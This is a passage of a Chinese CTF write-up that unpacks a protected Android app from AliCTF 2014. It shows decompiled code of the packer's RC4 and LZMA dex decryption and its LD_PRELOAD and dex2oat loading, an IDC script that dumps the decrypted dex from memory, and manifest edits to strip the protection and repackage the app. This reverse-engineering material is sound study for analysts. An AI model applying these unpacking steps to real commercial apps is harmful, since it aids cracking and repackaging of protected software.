v39; // [sp+3Ch] [bp-44h]  char *v40; // [sp+4Ch] [bp-34h]  char *v41; // [sp+50h] [bp-30h]  v3 = a2;  v4 = a3;  env = a1;  _android_log_print(6, &quot;debug&quot;, &quot;in...&quot;);  result = ali::init_classes(env, v6, v7);      // init classes  if ( result )    return result;  v9 = (ali *)_JNIEnv::CallNonvirtualVoidMethod(env, v3, ali::ContextWrapper, dword_54128, v4);  v36 = ali::NanoTime(v9);  v10 = _JNIEnv::GetObjectClass(env, v3);  v11 = _JNIEnv::GetMethodID(env, v10, &quot;getFilesDir&quot;, &quot;()Ljava/io/File;&quot;);  v12 = _JNIEnv::CallObjectMethod(env, v3, v11);  v13 = v12;  v14 = _JNIEnv::GetObjectClass(env, v12);  v15 = _JNIEnv::GetMethodID(env, v14, &quot;getAbsolutePath&quot;, &quot;()Ljava/lang/String;&quot;);  v16 = _JNIEnv::CallObjectMethod(env, v13, v15);  sub_247D8(&amp;v39, env, v16);  if ( &amp;v39 != (char *)&amp;ali::g_filePath )    std::string::_M_assign((std::string *)&amp;ali::g_filePath, v41, v40);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);  _android_log_print(3, &quot;debug&quot;, &quot;global files path is %s&quot;, dword_540E8);  v17 = _JNIEnv::CallObjectMethod(env, v3, dword_541A4);  if ( ali::sdk_int &lt;= 8 )  {    v20 = _JNIEnv::GetObjectField(env, v17, dword_5416C);    sub_247D8(&amp;v38, env, v20);    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v39, &amp;v38, &quot;/lib&quot;);    if ( &amp;v39 != (char *)&amp;ali::g_libPath )      std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);    v19 = &amp;v38;  }  else  {    v18 = _JNIEnv::GetObjectField(env, v17, dword_54170);    sub_247D8(&amp;v39, env, v18);    if ( &amp;v39 != (char *)&amp;ali::g_libPath )      std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40);    v19 = &amp;v39;  }  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v19);  _android_log_print(3, &quot;debug&quot;, &quot;global native path is %s&quot;, dword_540D0);  v21 = _JNIEnv::CallObjectMethod(env, v3, dword_541B0);  sub_247D8(&amp;v39, env, v21);  if ( &amp;v39 != (char *)&amp;ali::g_apkPath )    std::string::_M_assign((std::string *)&amp;ali::g_apkPath, v41, v40);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);  setenv(&quot;APKPATH&quot;, (const char *)dword_540B8, 1);  _android_log_print(3, &quot;debug&quot;, &quot;global apk path is %s&quot;, dword_540B8);  sub_24A64(env, v3);  v22 = (void *)_JNIEnv::CallObjectMethod(env, v4, dword_541A0);  v23 = v22;  if ( v22 )  {    v24 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, v22, 0);    v25 = v24;    v26 = strlen(v24);    std::string::_M_assign((std::string *)&amp;ali::g_pkgName, v25, &amp;v25[v26]);    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, v23, v25);  }  v37 = 0LL;  v27 = _JNIEnv::CallObjectMethod(env, v4, dword_541A8);  parse_dex(env, &amp;v37);                         // parse dex?  replace_classloader_cookie(env, v27, v37, HIDWORD(v37));  _android_log_print(3, &quot;debug&quot;, &quot;enter new application&quot;);// enter MainActivity?  v28 = dword_54120;  _JNIEnv::NewStringUTF(env, &quot;android.app.Application&quot;);  v29 = _JNIEnv::CallObjectMethod(env, v27, v28);  v30 = v29;  if ( v29 )  {    v32 = _JNIEnv::GetMethodID(env, v29, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);    dword_540A0 = _JNIEnv::NewObject(env, v30, v32);    _JNIEnv::CallVoidMethod(env, dword_540A0, dword_54134, v4);    _JNIEnv::DeleteLocalRef(env, v30);    v31 = &quot;exit new application&quot;;  }  else  {    v31 = &quot;can&#39;t findClass realAppClass&quot;;  }  v33 = (ali *)_android_log_print(3, &quot;debug&quot;, v31);  if ( dword_540A0 )  {    v33 = (ali *)env-&gt;functions-&gt;NewGlobalRef(&amp;env-&gt;functions, (jobject)dword_540A0);    dword_540A0 = (int)v33;  }  v34 = ali::NanoTime(v33);  _android_log_print(3, &quot;debug&quot;, &quot;##### attachBaseContext spent:&quot;);  ali::PrettyDuration((ali *)(v34 - v36), v35);  result = _android_log_print(3, &quot;debug&quot;, &quot;exit attachBaseContext&quot;);  return result;}</code></pre><p>接下来进入 parse_dex 进行分析。一开始判断了是采用了 Dalvik 模式还是 ART 模式。我的机器是 Android 4.4.4，用的是 Dalvik 模式，那就只分析一下 Dalvik 的部分。接下来对 SDK 的版本进行了判断，是否大于 SDK13。我用的机器是 SDK19，故下面应该是调用了 openWithHeader 函数。之后的部分看到是用 dlopen 打开 libdvm.so，并开始执行程序，所以就不做进一步分析。主要应该就是 openWithHeader 中的内容解析了出了 dex 文件：</p><pre><code class="cpp">signed int __fastcall parse_dex(_JNIEnv *a1, __int64 *a2){  int v2; // r7  const char *v3; // r1  char *v4; // r0  char *v5; // r9  unsigned __int8 *v6; // r3  int v7; // r2  int v8; // t1  int fd; // ST14_4  int v10; // r8  int v11; // r7  int v12; // r5  int v13; // r0  int v14; // r5  int v15; // r0  int v16; // r7  int v17; // r1  int v18; // r5  int (__fastcall *v19)(int, signed int); // r5  int v20; // r5  unsigned __int8 *v21; // r8  const char *v22; // r3  char *v23; // r0  char *v24; // r0  char *v25; // r6  ali::EncFile *v26; // r7  int v27; // r0  int *v28; // r0  char *v29; // r0  int v30; // r10  void *v31; // r7  int (__fastcall *v32)(unsigned __int8 *, int, signed int *); // r9  int (__fastcall *v33)(_DWORD); // r7  const char *v34; // r2  int v35; // r9  signed int v36; // r7  _DWORD *v37; // r9  _BYTE *v38; // r5  unsigned __int8 *v39; // r3  void *v40; // r0  JNINativeMethod *v41; // r0  unsigned __int8 *v42; // r3  signed int v43; // r3  _JNIEnv *v45; // [sp+8h] [bp-2A0h]  __int64 *v46; // [sp+10h] [bp-298h]  int v47; // [sp+24h] [bp-284h]  unsigned __int8 *v48; // [sp+28h] [bp-280h]  unsigned __int8 *v49; // [sp+2Ch] [bp-27Ch]  void (__cdecl *v50)(const unsigned int *, jvalue *); // [sp+30h] [bp-278h]  char v51; // [sp+34h] [bp-274h]  signed int v52[2]; // [sp+38h] [bp-270h]  char s; // [sp+40h] [bp-268h]  char v54; // [sp+54h] [bp-254h]  int v55; // [sp+64h] [bp-244h]  int v56; // [sp+68h] [bp-240h]  char v57; // [sp+6Ch] [bp-23Ch]  const char *v58; // [sp+80h] [bp-228h]  char v59; // [sp+84h] [bp-224h]  const char *v60; // [sp+98h] [bp-210h]  char v61; // [sp+9Ch] [bp-20Ch]  unsigned int v62; // [sp+B0h] [bp-1F8h]  char v63; // [sp+B4h] [bp-1F4h]  char v64; // [sp+CCh] [bp-1DCh]  int v65; // [sp+E0h] [bp-1C8h]  char v66; // [sp+E4h] [bp-1C4h]  char v67; // [sp+FCh] [bp-1ACh]  const char *v68; // [sp+110h] [bp-198h]  char v69; // [sp+114h] [bp-194h]  char v70; // [sp+12Ch] [bp-17Ch]  const char *v71; // [sp+140h] [bp-168h]  char v72; // [sp+144h] [bp-164h]  char *v73; // [sp+154h] [bp-154h]  char *v74; // [sp+158h] [bp-150h]  char v75; // [sp+15Ch] [bp-14Ch]  char v76; // [sp+174h] [bp-134h]  char v77; // [sp+18Ch] [bp-11Ch]  char v78; // [sp+1A4h] [bp-104h]  char v79; // [sp+1BCh] [bp-ECh]  char v80; // [sp+1D4h] [bp-D4h]  char v81; // [sp+1ECh] [bp-BCh]  char v82; // [sp+204h] [bp-A4h]  char v83; // [sp+21Ch] [bp-8Ch]  char v84; // [sp+234h] [bp-74h]  int v85; // [sp+244h] [bp-64h]  unsigned __int8 *v86; // [sp+248h] [bp-60h]  char v87; // [sp+24Ch] [bp-5Ch]  char v88; // [sp+264h] [bp-44h]  char *v89; // [sp+274h] [bp-34h]  char *v90; // [sp+278h] [bp-30h]  v45 = a1;  v46 = a2;  _android_log_print(3, &quot;debug&quot;, &quot;enter parse_dex&quot;);  if ( ali::isDalvik )                          // dalvik or art  {    v47 = 0;    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;ali::g_filePath, &quot;/cls.jar&quot;);// locate cls.jar    v25 = v90;    v26 = (ali::EncFile *)operator new(0xCu);    ali::EncFile::EncFile(v26, v25);    v48 = 0;    v49 = 0;    if ( ali::sdk_int &gt; 13 )                    // sdk version &gt; 13    {      v27 = ali::EncFile::openWithHeader(v26, &amp;v48, (unsigned int *)&amp;v47, 0x10u);      v49 = v48 + 16;    }    else                                        // sdk version &lt;= 13 ( android 3.x )    {      v27 = ali::EncFile::open(v26, &amp;v49, (unsigned int *)&amp;v47);    }    if ( v49 == (unsigned __int8 *)-1 )    {      v28 = (int *)_errno(v27);      v29 = strerror(*v28);      _android_log_print(3, &quot;debug&quot;, &quot;mmap dex file :%s&quot;, v29);LABEL_45:      v24 = &amp;v88;      goto LABEL_46;    }    v30 = *((_DWORD *)v49 + 8);    if ( ali::sdk_int &gt; 13 )                    // sdk version &gt; 13    {      v40 = dlopen(&quot;libdvm.so&quot;, 1);             // open libdvm.so and start execute program      v41 = (JNINativeMethod *)dlsym(v40, &quot;dvm_dalvik_system_DexFile&quot;);      v50 = 0;      lookup(v41, &quot;openDexFile&quot;, &quot;([B)I&quot;, &amp;v50);      v42 = v48;      *((_DWORD *)v48 + 2) = v47;      *(_DWORD *)&amp;v51 = v42;      ((void (*)(void))v50)();      v43 = v52[0];      *v46 = v52[0];      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 32) = *(_DWORD *)(v43 + 16);      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v43 + 8) + 4) + 36) = v47;      ali::EncFile::~EncFile(v26);      operator delete((void *)v26);    }    else                                        // sdk version &lt;= 13 ( android 3.x )    {      v31 = dlopen(&quot;libdvm.so&quot;, 1);      v32 = (int (__fastcall *)(unsigned __int8 *, int, signed int *))dlsym(v31, &quot;dvmDexFileOpenPartial&quot;);      v33 = (int (__fastcall *)(_DWORD))dlsym(v31, &quot;dexCreateClassLookup&quot;);      v52[0] = 0;      if ( v32(v49, v30, v52) == -1 )      {        v34 = &quot;dvmDexFileOpenPartial error&quot;;LABEL_40:        _android_log_print(3, &quot;debug&quot;, v34);        goto LABEL_45;      }      v35 = *(_DWORD *)v52[0];      *(_DWORD *)(v35 + 36) = v33(*(_DWORD *)v52[0]);      v36 = v52[0];      if ( !*(_DWORD *)(*(_DWORD *)v52[0] + 36) )      {        v34 = &quot;dexCreateClassLookup error&quot;;        goto LABEL_40;      }      v37 = malloc(0x2Cu);      v38 = malloc(0x14u);      strdup((const char *)&amp;unk_4CEE9);      v38[4] = 0;      v38[5] = 0;      *((_DWORD *)v38 + 2) = 0;      v39 = v49;      *(_DWORD *)v38 = v38;      *((_DWORD *)v38 + 3) = v37;      v37[10] = v36;      *(_DWORD *)(v36 + 32) = v39;      *(_DWORD *)(v36 + 36) = v47;      *v46 = (signed int)v38;    }    v23 = &amp;v88;    goto LABEL_44;  }  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v54, &amp;ali::g_filePath, &quot;/cls.jar&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v57, &amp;ali::g_filePath, &quot;/cls.dex&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v59, &amp;ali::g_filePath, &quot;/fak.jar&quot;);  _android_log_print(3, &quot;debug&quot;, &quot;before oat gen&quot;);  if ( !access(v58, 0) )    goto LABEL_24;  v2 = android_getCpuFamily();  std::string::string(&amp;v63, &quot;arm&quot;, &amp;v51);  switch ( v2 )  {    case 1:      v3 = &quot;arm&quot;;LABEL_5:      std::string::operator=(&amp;v63, v3);      break;    case 2:      v3 = &quot;x86&quot;;      goto LABEL_5;    case 3:    case 6:      v3 = &quot;mips&quot;;      goto LABEL_5;    case 4:      v3 = &quot;arm64&quot;;      goto LABEL_5;    case 5:      v3 = &quot;x86_64&quot;;      goto LABEL_5;  }  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v64, &amp;ali::g_libPath, &quot;/libhack.so&quot;);  v4 = getenv(&quot;LD_PRELOAD&quot;);  v5 = v4;  if ( v4 )  {    _android_log_print(3, &quot;debug&quot;, &quot;the system already define LD_PRELOAD=%s&quot;, v4);    std::string::string(&amp;v84, v5, v52);    v6 = v86;    v7 = v85;    while ( v6 != (unsigned __int8 *)v7 )    {      v8 = *v6++;      if ( v8 == 32 )        *(v6 - 1) = 58;    }    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v87, &amp;v84, &quot;:&quot;);    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;v87, &amp;v64);    std::string::_M_assign((std::string *)&amp;v64, v90, v89);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v88);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v87);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84);  }  _android_log_print(3, &quot;debug&quot;, &quot;the new LD_PRELOAD is %s&quot;, v65);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v66, &amp;ali::g_filePath, &quot;/juice.data&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v67, &amp;ali::g_filePath, &quot;/fak.jar&quot;);  fd = open(v68, 0);  memset(&amp;s, 0, 0x14u);  sprintf(&amp;s, &quot;%d&quot;, fd);  std::string::string(&amp;v69, &amp;s, v52);  v73 = &amp;v72;  v74 = &amp;v72;  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_allocate_block(&amp;v72, v55 - v56 + 10);  *v73 = 0;  std::string::_M_appendT&lt;char const*&gt;(&amp;v72, &quot;DEX_FILE=&quot;, &quot;&quot;, v52);  std::string::append((std::string *)&amp;v72, (const std::string *)&amp;v54);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v75, &amp;v72, &quot;                     JUICE_FILE=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v76, &amp;v75, &amp;v66);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v77, &amp;v76, &quot;                     LD_PRELOAD=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v78, &amp;v77, &amp;v64);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(    &amp;v79,    &amp;v78,    &quot;                     /system/bin/dex2oat \t\t\t\t  \t --runtime-arg -Xms64m \t\t\t\t\t --runtime-arg -Xmx64m \t\t\t\t&quot;    &quot;\t --boot-image=/system/framework/boot.art                      --zip-fd=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v80, &amp;v79, &amp;v69);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v81, &amp;v80, &quot;\t\t\t\t\t --zip-location=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v82, &amp;v81, &amp;v67);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v83, &amp;v82, &quot;\t\t\t\t\t --oat-file=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v84, &amp;v83, &amp;v57);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v70, &amp;v84, &quot;                     &quot;);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v83);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v82);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v81);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v80);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v79);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v78);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v77);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v76);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v75);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v72);  _android_log_print(3, &quot;debug&quot;, &quot;cmd is %s&quot;, v71);  system(v71);  close(fd);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v70);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v69);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v67);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v66);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v64);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v63);LABEL_24:  _android_log_print(3, &quot;debug&quot;, &quot;after oat gen&quot;);  v10 = ali::JDexFile;  v11 = dword_54140;  if ( ali::sdk_int &lt;= 19 )                     // sdk version &lt;= 19  {    v12 = _JNIEnv::NewStringUTF(v45, v60);    v13 = _JNIEnv::NewStringUTF(v45, v58);    v16 = _JNIEnv::CallStaticIntMethod(v45, v10, v11, v12, v13, 0);    v18 = 0;  }  else                                          // sdk version &gt; 19  {    v14 = _JNIEnv::NewStringUTF(v45, v60);    v15 = _JNIEnv::NewStringUTF(v45, v58);    v16 = _JNIEnv::CallStaticLongMethod(v45, v10, v11, v14, v15, 0);    v18 = v17;  }  _android_log_print(3, &quot;debug&quot;, &quot;cookie is %llx&quot;);  *(_DWORD *)v46 = v16;  *((_DWORD *)v46 + 1) = v18;  v19 = (int (__fastcall *)(int, signed int))dlsym((void *)0xFFFFFFFF, &quot;_ZNK3art7DexFile12FindClassDefEt&quot;);  _android_log_print(3, &quot;debug&quot;, &quot;DexFile::FindClassDefFn is %p&quot;, v19);  v20 = v19(v16, 1);  _android_log_print(3, &quot;debug&quot;, &quot;call FindClassDefFn(%p,%d) =&gt; %p&quot;, v16, 1, v20);  _android_log_print(3, &quot;debug&quot;, &quot;dex position is %p&quot;, v20 - 572);  _android_log_print(3, &quot;debug&quot;, &quot;dex head is %08x %08x&quot;, *(_DWORD *)(v20 - 572), *(_DWORD *)(v20 - 568));  v21 = *(unsigned __int8 **)(v20 - 540);  _android_log_print(3, &quot;debug&quot;, &quot;dex size is %d&quot;, v21);  MemEnableWrite((unsigned __int8 *)(v20 - 572), &amp;v21[v20 - 572]);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v61, &amp;ali::g_filePath, &quot;/juice.data&quot;);  if ( !ali::dex_juicer_patch((ali *)(v20 - 572), v21, v62, v22) )  {    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57);    v23 = &amp;v54;LABEL_44:    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v23);    _android_log_print(3, &quot;debug&quot;, &quot;exit parse_dex&quot;);    return 0;  }  _android_log_print(6, &quot;debug&quot;, &quot;fail to patch dex&quot;);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57);  v24 = &amp;v54;LABEL_46:  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v24);  _android_log_print(3, &quot;debug&quot;, &quot;exit parse_dex error&quot;);  return -1;}</code></pre><p>在 openWithHeader 中，log 了三次 dex 的 magic number，中间分别进行了 RC4 解密和 LZMA 解压缩。最后得到的结果应该就是最终的 dex 文件：</p><pre><code class="cpp">int __fastcall ali::EncFile::openWithHeader(ali::EncFile *this, unsigned __int8 **a2, unsigned int *a3, unsigned int a4){  ali::EncFile *v4; // r5  unsigned __int8 **v5; // r11  unsigned int *v6; // r6  unsigned int v7; // r7  const char *v8; // r2  int fd; // r8  int v10; // r10  __blksize_t v12; // r3  unsigned __int8 *v13; // r4  ali *v14; // r0  __int64 v15; // r0  __int64 v16; // ST18_8  unsigned int *v17; // r3  ali *v18; // r0  __int64 v19; // r0  int v20; // r8  int v21; // r3  char v22; // r2  unsigned __int64 v23; // r0  ali *v24; // r0  unsigned __int8 *v25; // r9  ali *v26; // ST24_4  __int64 v27; // r0  __int64 v28; // ST18_8  ali *v29; // r0  __int64 v30; // r0  size_t v31; // [sp+2Ch] [bp-9Ch]  int v32; // [sp+30h] [bp-98h]  char v33; // [sp+34h] [bp-94h]  struct stat buf; // [sp+38h] [bp-90h]  v4 = this;  v5 = a2;  v6 = a3;  v7 = a4;  if ( !*((_DWORD *)this + 2) )  {    v8 = &quot;file path is null&quot;;LABEL_5:    _android_log_print(6, &quot;debug&quot;, v8);    return 0;  }  fd = open(*((const char **)this + 2), 0);  v10 = fstat(fd, &amp;buf);  if ( v10 )  {    v8 = &quot;fstat failed&quot;;    goto LABEL_5;  }  v12 = buf.st_blksize;  *v6 = buf.st_blksize;  *(_DWORD *)v4 = v12;  v13 = (unsigned __int8 *)mmap(0, *v6, 3, 2, fd, 0);  *((_DWORD *)v4 + 1) = v13;  close(fd);  v14 = (ali *)_android_log_print(                 3,                 &quot;debug&quot;,                 &quot;dex magic %c %c %c %c %c %c %c&quot;,// original dex magic                 *v13,                 v13[1],                 v13[2],                 v13[3],                 v13[4],                 v13[5],                 v13[6]);  LODWORD(v15) = ali::NanoTime(v14);  v16 = v15;  v18 = (ali *)ali::decryptRc4((ali *)v13, v13, (unsigned __int8 *)v6, v17);// RC4 decrypt  LODWORD(v19) = ali::NanoTime(v18);  ali::PrettyDuration((ali *)(v19 - v16), v19 - v16);  _android_log_print(3, &quot;debug&quot;, &quot;decrypted len:%u&quot;, *v6);  v20 = 0;  _android_log_print(    3,    &quot;debug&quot;,    &quot;after decrypt dex magic %c %c %c %c %c %c %c&quot;,// dex magic after RC4    *v13,    v13[1],    v13[2],    v13[3],    v13[4],    v13[5],    v13[6]);  v21 = (int)(v13 + 4);  do  {    v22 = 8 * v10++;    v23 = (unsigned __int64)*(unsigned __int8 *)(v21++ + 1) &lt;&lt; v22;    v20 += v23;  }  while ( v10 != 8 );  _android_log_print(3, &quot;debug&quot;, &quot;unpackSize: %u&quot;, v20);  *(_DWORD *)v4 = v7 + v20;  v24 = (ali *)mmap(0, v7 + v20, 3, 34, -1, 0);  *((_DWORD *)v4 + 1) = v24;  v25 = (unsigned __int8 *)v24 + v7;  v26 = v24;  LODWORD(v27) = ali::NanoTime(v24);  v31 = *v6;  v28 = v27;  v32 = v20;  v29 = (ali *)LzmaDecode(v25, &amp;v32, v13 + 13, &amp;v31, v13, 5, 1, &amp;v33, &amp;off_54028);// LZMA uncompress  LODWORD(v30) = ali::NanoTime(v29);  ali::PrettyDuration((ali *)(v30 - v28), v30 - v28);  munmap(v13, buf.st_blksize);  _android_log_print(    3,    &quot;debug&quot;,    &quot;after uncompressed dex magic %c %c %c %c %c %c %c&quot;,// dex magic after LZMA    *((unsigned __int8 *)v26 + v7),    v25[1],    v25[2],    v25[3],    v25[4],    v25[5],    v25[6]);  *v6 = v20;  if ( v5 )    *v5 = (unsigned __int8 *)*((_DWORD *)v4 + 1);  return *((_DWORD *)v4 + 1);}</code></pre><h1 id="Dump-Dex-File"><a href="#Dump-Dex-File" class="headerlink" title="Dump Dex File"></a>Dump Dex File</h1><p>知道了解析 dex 的流程，接下来就通过动态调试来吧 dex 文件 dump 下来。现在 BL 跳转到 openWithHeader 的语句处设下断点：</p><pre><code>.text:00026A7E loc_26A7E                               ; CODE XREF: parse_dex(_JNIEnv *,long long *)+622↑j.text:00026A7E                 MOV             R1, R9  ; unsigned __int8 **.text:00026A80                 MOV             R2, R4  ; unsigned int *.text:00026A82                 MOVS            R3, #0x10 ; unsigned int.text:00026A84                 BL              _ZN3ali7EncFile14openWithHeaderEPPhPjj ; ali::EncFile::openWithHeader(uchar **,uint *,uint).text:00026A88                 LDR.W           R3, [R9].text:00026A8C                 ADDS            R3, #0x10.text:00026A8E                 STR             R3, [R6]</code></pre><p>运行到断点处，单步步入 openWithHeader 函数，然后单步步过一直到 return，中间可以在 monitor 中用 tag:debug 过滤来查看 log。运行完后看到 log 输出的 magic number 已经是真实 dex 文件的样子了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/1.png" srcset="/img/loading.gif" alt></p><p>根据函数的返回值存放在 R0 中，可以看到 R0 所指向的部分是一个 dex 文件的数据了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/2.png" srcset="/img/loading.gif" alt></p><p>接下来我们可以把 dex 文件给 dump 下来。但文件的大小为多少？根据 dex 的数据结构，可以知道 dex 文件的大小位于偏移 0x20 处：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/3.png" srcset="/img/loading.gif" alt></p><p>接下来使用 IDC 脚本来 dump 数据：</p><pre><code class="cpp">static main(void) {    auto fp, begin, end, len, b;    fp = fopen(&quot;dump.dex&quot;, &quot;wb&quot;);    begin = 0x7584C010; // 解密后数据在内存中的位置    len = 0x0941FC; // 文件大小    end = begin + len;    for (b = begin; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>最后将 dump 下来的数据放进 JEB 中，反汇编可以得到真实的 MainActivity 代码：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/4.png" srcset="/img/loading.gif" alt></p><h1 id="Fix-Application"><a href="#Fix-Application" class="headerlink" title="Fix Application"></a>Fix Application</h1><p>使用 AndroidKiller 反编译加固后的 apk，找到 AndroidManifest.xml，删除 Application 的 android:name 属性：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.ali.tg.testapp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2438415&quot;&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;    &lt;application android:allowBackup=&quot;true&quot; android:debuggable=&quot;true&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;.WebViewActivity&quot;/&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>回编译后，找到生成的 apk，压缩软件打开，替换我们 dump 出来的 classes.dex，同时删除 assets 文件夹，其他 so 文件不用管。修改完后重新签名打包并安装运行，可以正常使用。</p><h1 id="Find-Flag"><a href="#Find-Flag" class="headerlink" title="Find Flag"></a>Find Flag</h1><p>定位到真实的程序后，开始分析具体的内容。先来看 MainActivity，主要是一个点击事件，其中获取了 EditText 中的字符串并作为参数传入并启动 WebViewActivity：</p><pre><code class="java">package com.ali.tg.testapp;import android.app.Activity;import android.content.Intent;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.view.View$OnClickListener;import android.view.View;import android.widget.Button;import android.widget.EditText;public class MainActivity extends Activity {    class com.ali.tg.testapp.MainActivity$1 implements View$OnClickListener {        com.ali.tg.testapp.MainActivity$1(MainActivity arg1) {            MainActivity.this = arg1;            super();        }        public void onClick(View arg6) {            